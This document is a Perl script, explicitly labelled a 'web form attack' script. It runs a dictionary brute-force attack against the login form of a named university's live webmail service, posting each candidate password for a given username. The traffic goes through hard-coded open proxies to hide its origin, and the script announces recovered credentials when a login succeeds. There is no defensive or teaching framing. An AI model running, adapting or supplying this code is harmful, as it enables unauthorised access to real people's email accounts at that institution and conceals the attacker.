# correo PAS-ADI web form attack perl script
use LWP::UserAgent;
use Term::ANSIColor;
use strict ;
use warnings;
my @proxies = ( 'http://149.202.249.227:3128', 'http://79.120.72.222:3128');
if ($#ARGV < 1) {	
	print "Usage:\n";
	print "perl correoP.pl <username> <dictionaryFile>\n";
	exit();
}
my $correoPurl = "https://webmail.unavarra.es/correo2/src/redirect.php";
my $user = $ARGV[0];
my $file = $ARGV[1]; 
open (FILE,$file) || die color("red"), "Could not open file '$file'\n", color("reset");
my @dictionary = <FILE> ;
my $wagent = new LWP::UserAgent;
$ENV{HTTP_proxy} = 'http://149.202.249.227:3128'; 
$wagent->env_proxy;
my $request = new HTTP::Request 'POST',$correoPurl;
$a=0;
foreach(@dictionary) {
	my $password = $_ ;
        $a+=1;
	chomp($password);
        if ($password =~ /ñ/){
               print color("red"), "The passwords of this site cannot contain  the letter ñ\n", color("reset");
            $password=chomp($password);
        }
	$request->content_type('application/x-www-form-urlencoded');
        $request->content("&dominioupna=p&login_username=$user&secretkey=$password&js_autodetect_results=1&just_logged_in=1&loginServer=%40.unavarra.es");
	my $respons = $wagent->request($request);
	my $response = $respons->as_string;
	if ( $response !~ /Usuario o contraseña incorrecto/ && $response !~ /Access denied. Please contact your system administrator/ && $response !~ /500 Can't connect to webmail.unavarra.es/ && $response !~ /Error de servidor/) {	
		print color("green"),"Successful attack! Credentials are: username=$user and password=$password\n", color("reset");
                exit() ;	
	}
        if ( $response =~ /500 Can't connect to webmail.unavarra.es/){
                print "An error 500 has occurred"
        }
        if ($a%100==0){
                print "$a passwords tested\n" ;
        }		
}
